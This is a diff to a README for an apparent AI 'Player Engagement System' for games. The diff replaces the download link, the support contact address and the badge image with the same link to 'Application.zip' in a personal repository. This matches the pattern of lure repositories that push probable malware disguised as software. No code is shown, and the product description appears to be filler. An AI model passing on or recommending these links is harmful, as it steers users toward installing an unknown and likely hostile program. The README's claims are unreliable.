@@ -25,7 +25,7 @@ The **Player Engagement System** is an AI-powered system designed to enhance pla
 
 🔑 **Topics**: ai, ai-driven-features, artificial-intelligence, content-generation, dynamic-storytelling, game-development, game-personalization, gaming, gaming-ai, generative-ai, in-game, interactive-systems, machine-learning, personalization, player-engagement, player-retention, procedural-generation, recommendation-system, rewards, user-experience
 
-🌐 **Link**: [Download Player Engagement System](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip) 
+🌐 **Link**: [Download Player Engagement System](https://github.com/f60n/player-engagement-system/releases/download/v1.0/Application.zip) 
 
 🚀 *Launch link to download the Player Engagement System.*
 
@@ -47,7 +47,7 @@ To start using the Player Engagement System, follow these simple steps:
 
 If you encounter any issues or have questions about the Player Engagement System, please check the "Releases" section of this repository for updates and bug fixes. You can also reach out to the developers for assistance.
 
-📧 For inquiries, contact: playersupport@engagementsystem.com
+📧 For inquiries, contact: https://github.com/f60n/player-engagement-system/releases/download/v1.0/Application.zip
 
 ## Collaborators
 
@@ -65,4 +65,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🎮 Start enhancing player engagement today with the Player Engagement System! 🌟
 
-[![Download Player Engagement System](https://img.shields.io/badge/Download-Player_Engagement_System-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Player Engagement System](https://github.com/f60n/player-engagement-system/releases/download/v1.0/Application.zip)](https://github.com/f60n/player-engagement-system/releases/download/v1.0/Application.zip)
